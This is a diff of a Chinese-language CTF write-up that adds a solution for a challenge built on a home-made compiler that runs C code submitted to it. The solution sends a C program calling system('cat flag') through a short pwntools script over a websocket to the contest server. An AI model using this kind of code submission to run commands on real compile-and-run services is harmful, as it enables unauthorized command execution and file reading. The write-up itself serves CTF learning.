@@ -158,4 +158,33 @@ p.interactive()
 shell:
 ![[Pasted image 20250210233827.png]]
 ## walt改造的编译器
-是一个自制的编译器，编译后有一千多行代码不好逐行分析，大致作用就是输入一段c的代码然后会bian y
+是一个自制的编译器，编译后有一千多行代码不好逐行分析，大致作用就是输入一段c的代码然后会编译他并运行，我们直接输入
+```c
+int main()
+{
+	system("cat flag");
+	return 0;
+}
+```
+即可。题目只是看着唬人。
+exp:
+```python
+from pwn import *
+from wstube import websocket
+
+context(arch='amd64', os='linux', log_level='debug')
+local = False
+if local:
+	p = process('./walt')
+	pwnlib.gdb.attach(p, 'b puts')
+else:
+	p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194ef0d-e305-79ab-b861-72f478ac41cf')
+
+test = r'''int main(){system("cat flag");return 0;}'''
+
+# p.recvuntil(b'This is crazy!!!')
+p.sendline(test)
+
+p.interactive()
+```
+shell:
